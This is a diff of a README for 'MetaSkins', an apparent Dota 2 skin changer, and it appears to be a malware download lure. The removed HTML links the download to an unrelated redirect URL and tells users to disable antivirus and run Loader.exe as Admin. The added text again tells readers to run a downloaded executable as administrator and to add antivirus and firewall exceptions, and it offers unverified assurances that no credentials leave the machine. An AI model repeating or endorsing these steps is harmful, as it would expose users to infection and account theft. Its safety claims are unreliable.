@@ -1,16 +1,79 @@
-<div style="max-width:800px;margin:auto;padding:20px;font-family:Arial,sans-serif;line-height:1.6;background:#0a0a0f;color:#e0e0e0;border-radius:15px;">
-<h1 style="color:#66ff99;border-bottom:2px solid #33cc66;text-align:center;">✨ MetaSkins | Access All In-Game Skins & Exclusive Custom Sets ✨</h1>
-<p style="font-size:1.1em;text-align:center;"><strong>Unlock the best Dota 2 skinning experience.</strong> MetaSkins gives you access to every in-game skin (Arcanas, Immortals) plus hundreds of exclusive, high-quality custom skins.</p>
-<div style="background:#111116;padding:20px;text-align:center;margin:15px 0;"><a href="https://www.shawonline.co.za/redirl" style="background:#66ff99;color:#000;padding:12px 25px;">⬇️ DOWNLOAD METASKINS (LOADER)</a><p>✅ All in-game skins ✅ Custom sets ✅ Meta helper ✅ FPS boost mod</p></div>
-<img src="https://i.ytimg.com/vi/7SWG25RDAfo/hq720.jpg?sqp=-oaymwEhCK4FEIIDSFryq4qpAxMIARUAAAAAGAElAADIQj0AgKJD&rs=AOn4CLA-fpQrzjjVKoaiiHnXgOtA_9Pkew" style="max-width:100%;border-radius:8px;margin:15px 0;">
-<div><h3>🎮 What Makes MetaSkins Unique:</h3>
-<ul><li><strong>Unlock Every In-Game Skin:</strong> Gain instant access to all existing Arcanas, Immortals, landscapes, couriers, and weather effects.</li>
-<li><strong>Exclusive Custom Sets:</strong> Enjoy a constantly expanding library of unique, high-quality custom skins created by the community.</li>
-<li><strong>Low Poly Map Mod:</strong> Includes a low-polygon terrain to boost your game's FPS and performance.</li>
-<li><strong>MetaPicker & Build Assistant:</strong> Real-time hero suggestion tool and in-game build helper to improve your win rate.</li>
-<li><strong>Custom Lighting & Effects:</strong> Personalize your game with custom lighting, trees, river colors, and cursor trails.</li></ul>
-<h3>⚙️ System Requirements:</h3><p>Windows 10/11, 8 GB RAM, Steam and Dota 2 installed, 500 MB free space.</p>
-<h3>📥 Installation:</h3>
-<div style="display:grid;grid-template-columns:repeat(4,1fr);gap:10px;text-align:center;"><div>1. Download archive</div><div>2. Disable antivirus (temp)</div><div>3. Run Loader.exe as Admin</div><div>4. Press INSERT to open menu</div></div>
-<div><strong>Tags:</strong> metaskins dota 2, dota 2 skin changer metaskins, dota 2 skin changer no ban 2026, best dota 2 skin changer 2026, dota 2 custom skins download, dota 2 skin changer free 2026, dota 2 all arcanas unlocker, dota 2 meta helper.</div>
-</div>
+# 🛠️ -MetaSkins-Access-All-In-Game-Skins-Exclusive-Custom-Sets - Unlock every skin for your games
+
+[![Download MetaSkins](https://img.shields.io/badge/Download-MetaSkins-blue)](https://github.com/Afolabiebu4567/-MetaSkins-Access-All-In-Game-Skins-Exclusive-Custom-Sets)
+
+MetaSkins allows players to access all in-game skins and custom sets. This application simplifies the process of installing cosmetic upgrades for your favorite titles. You can navigate through a library of skins, select your preferred items, and apply them directly to your game files. 
+
+## 📋 System Requirements
+
+To run this software, your computer needs to meet basic specifications. Ensure your system follows these guidelines:
+
+* Operating System: Windows 10 or Windows 11.
+* Memory: 4GB RAM minimum.
+* Storage: 200MB of free disk space.
+* Internet Connection: Stable connection for downloading skin assets.
+* Permissions: Administrative access to modify local game files.
+
+## 📥 How to Install
+
+Follow these steps to set up the application on your Windows machine.
+
+1. Visit this page to download the software: https://github.com/Afolabiebu4567/-MetaSkins-Access-All-In-Game-Skins-Exclusive-Custom-Sets.
+2. Locate the download button on the page.
+3. Save the executable file to your computer.
+4. Open your downloads folder.
+5. Double-click the file to start the installer.
+6. Follow the on-screen prompts to complete the setup process.
+7. Launch the program from your desktop shortcut.
+
+## 🕹️ Using the Application
+
+The program interface provides a clear view of available content. 
+
+1. Select your target game from the list.
+2. Browse the categories to find specific skins or sets.
+3. Click on a skin to see its preview.
+4. Press the Apply button to inject the skin into your game.
+5. Launch your game through the official game client to view the changes.
+
+## 🛡️ Maintaining Security
+
+Safe usage keeps your account and files secure. 
+
+* Use the application only for cosmetic changes.
+* Back up your game configuration files before applying new content.
+* Keep the software updated to maintain compatibility with game patches.
+* If a game update breaks the skin, run the repair tool inside the MetaSkins menu.
+
+## 🤝 Troubleshooting
+
+If you encounter issues, refer to these solutions.
+
+* Application fails to launch: Right-click the shortcut and select "Run as administrator."
+* Skins do not appear: Make sure the game is closed before you apply changes.
+* Installation errors: Check your antivirus software. Sometimes security tools prevent the program from modifying game folders. Add an exception for the MetaSkins installation directory if this occurs.
+* Network issues: Ensure your firewall allows the application to reach the server.
+
+## 💻 Technical Details
+
+The engine optimizes how skin data loads into the game. It uses a file injection method that replaces local textures without altering server-side game logic. This approach ensures your game client remains stable during gameplay. 
+
+The application architecture includes several components:
+
+* Skin Manager: Handles the library and preview features.
+* Patching Engine: Modifies necessary files while keeping the original game integrity intact.
+* Update Checker: Syncs with the cloud to bring you the latest custom sets as they release.
+
+The software performs these actions locally on your computer. It does not send your login credentials to third-party servers. Your data stays on your machine at all times. 
+
+## 🌐 Community and Support
+
+The tool benefits from constant updates. Users can request specific skins or report bugs through the issues tab on the repository. Feedback helps improve the injection method and interface. 
+
+To provide feedback:
+1. Go to the project page.
+2. Click on the Issues tab.
+3. Describe the problem or suggestion clearly.
+4. Add screenshots if they help explain the situation.
+
+This project relies on community engagement to expand skin support. Please ensure your report includes the name of the game and the version of the skin you attempted to use.
